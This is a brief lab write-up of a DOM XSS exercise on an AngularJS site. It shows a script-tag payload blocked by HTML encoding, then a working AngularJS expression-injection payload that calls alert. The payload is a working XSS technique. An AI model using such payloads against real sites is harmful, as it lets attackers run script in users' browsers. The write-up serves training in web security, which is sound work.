# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal:

Exploit the DOM XSS vulnerability to call the alert function.

### Analysis/Exploit:

**Let’s try to inject some JavaScript code:**

`<script>alert(document.domain)</script>`

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/a71a87eb6161_001.png)

**View source page:**

`<section class=blog-header>
    <h1>0 search results for '&lt;script&gt;alert(document.domain)&lt;/script&gt;'</h1>
    <hr>
</section>`

As you can see, the `<>` is HTML encoded.

**However, since AngularJS is being used, we can execute JavaScript expressions within double curly braces**

```javascript

{{$on.constructor('alert(1)')()}}
```
